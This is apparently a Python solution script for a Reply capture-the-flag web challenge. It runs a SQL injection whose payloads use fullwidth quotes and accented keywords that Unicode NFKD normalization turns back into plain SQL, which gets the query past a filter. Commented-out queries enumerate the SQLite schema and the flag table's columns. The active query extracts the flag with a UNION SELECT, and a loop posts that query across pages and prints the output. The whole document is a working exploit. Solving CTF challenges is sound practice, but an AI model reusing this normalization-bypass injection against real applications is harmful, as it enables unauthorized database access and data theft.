import requests as rq
import unicodedata
from bs4 import BeautifulSoup

url = 'http://gamebox1.reply.it/dc5ff0efae41b3500b9ebc0ee9ee5a78c98f41a9/'
s = rq.Session()

#query = 'xxx\uff07 uniòn sèlect \uff07f09f90\uff07,\uff0780;c0\uff07,name,1 FRòM sqlite_schema WHèRè name likè \uff07%'
#query = 'xxx\uff07 uniòn sèlect \uff07f09f90\uff07,\uff0780;c0\uff07,name,1 FRòM PRAGMA_TABLE_INFO\uff08\uff07R3PLYCH4LL3NG3FL4G\uff07\uff09 WHèRè name likè \uff07%'
query = 'xxx\uff07 uniòn sèlect \uff07f09f90\uff07,\uff0780;c0\uff07,value,1 FRòM R3PLYCH4LL3NG3FL4G WHèRè value likè \uff07%'

# Check query
norm = unicodedata.normalize("NFKD", query).encode('ascii', 'ignore').decode('ascii')
print(f'{norm = }')

for i in range(10):
	r = s.post(url, {'query':query, 'page':f'{i}'})
	soup = BeautifulSoup(r.text, "lxml")
	header = soup.find_all('div', {'class':'category'})
	for h in header:
		print(h.text)
